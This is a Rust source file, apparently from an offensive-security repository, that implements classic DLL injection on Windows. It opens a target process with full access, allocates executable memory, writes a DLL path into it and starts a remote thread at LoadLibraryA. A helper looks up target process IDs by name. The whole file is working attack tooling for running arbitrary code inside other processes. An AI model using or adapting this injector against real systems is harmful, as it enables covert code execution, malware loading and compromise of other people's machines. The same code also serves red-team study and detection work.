// https://github.com/trickster0/OffensiveRust/blob/master/memN0ps/arsenal-rs/dll_injector_classic-rs/inject/src/main.rs

use std::{mem::size_of, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{
            Debug::WriteProcessMemory,
            ToolHelp::{
                CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
                TH32CS_SNAPPROCESS,
            },
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
    },
};

pub fn inject(pid: u32, file_path: &str) {
    let process_id = pid;

    let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };

    if hprocess == 0 {
        println!("{}", "[-] Error: failed to open process");
    }

    let allocated_memory = unsafe {
        VirtualAllocEx(
            hprocess,
            null_mut(),
            file_path.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if allocated_memory.is_null() {
        println!("[-] Error: failed to allocate memory in the process");
    }

    let mut tmp = 0;
    let wpm_result = unsafe {
        WriteProcessMemory(
            hprocess,
            allocated_memory,
            file_path.as_ptr() as _,
            file_path.len(),
            &mut tmp,
        )
    };

    if wpm_result == 0 {
        println!("[-] Error: failed to write to process memory");
    }

    let k32_address = unsafe { GetModuleHandleA("KERNEL32.DLL\0".as_ptr()) };

    if k32_address == 0 {
        println!("[-] Error: failed to get module handle");
    }

    let loadlib_address = unsafe {
        GetProcAddress(k32_address, "LoadLibraryA\0".as_ptr())
            .expect("Failed to get LoadLibraryA address")
    };

    let mut tmp = 0;
    let hthread = unsafe {
        CreateRemoteThread(
            hprocess,
            null_mut(),
            0,
            Some(std::mem::transmute(loadlib_address as usize)),
            allocated_memory,
            0,
            &mut tmp,
        )
    };

    if hthread == 0 {
        println!("[-] Error: gfailed to create remote thread");
    }

    unsafe { CloseHandle(hthread) };
    unsafe { CloseHandle(hprocess) };
}

/// Gets the process ID by name, take process name as a parameter
pub fn get_process_list(process_name: &str) -> Result<Vec<u32>, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err("Failed to call CreateToolhelp32Snapshot".to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err("Failed to call Process32First".to_owned());
    }

    let mut processes = Vec::new();
    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase() {
            processes.push(process_entry.th32ProcessID);
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            break;
        }
    }

    Ok(processes)
}

/// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}